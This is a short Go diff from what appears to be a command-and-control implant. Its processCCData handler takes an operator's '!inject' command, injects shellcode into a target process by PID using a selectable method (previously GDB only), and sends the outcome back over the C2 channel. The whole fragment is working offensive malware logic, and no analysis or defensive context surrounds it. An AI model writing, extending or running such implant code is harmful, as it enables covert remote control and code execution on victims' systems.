@@ -137,21 +137,18 @@ func processCCData(data *MsgTunData) {
 
 		// GDB inject
 		if cmdSlice[0] == "!inject" {
-			out = "an error occurred"
-			if cmdSlice[1] == "gdb" {
-				out = "GDB has successfully injected shellcode into target process" +
-					"\nYour shellcode will run before target process exits"
-				if len(cmdSlice) != 3 {
-					goto send
-				}
-				pid, err := strconv.Atoi(cmdSlice[2])
-				if err != nil {
-					log.Print("Invalid pid")
-				}
-				err = GDBInjectShellcode(pid)
-				if err != nil {
-					out = "failed: " + err.Error()
-				}
+			if len(cmdSlice) != 3 {
+				goto send
+			}
+			out = fmt.Sprintf("%s has successfully injected shellcode into target process", cmdSlice[1]) +
+				"\nYour shellcode will run before target process exits"
+			pid, err := strconv.Atoi(cmdSlice[2])
+			if err != nil {
+				log.Print("Invalid pid")
+			}
+			err = InjectShellcode(pid, cmdSlice[1])
+			if err != nil {
+				out = "failed: " + err.Error()
 			}
 			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
 			goto send
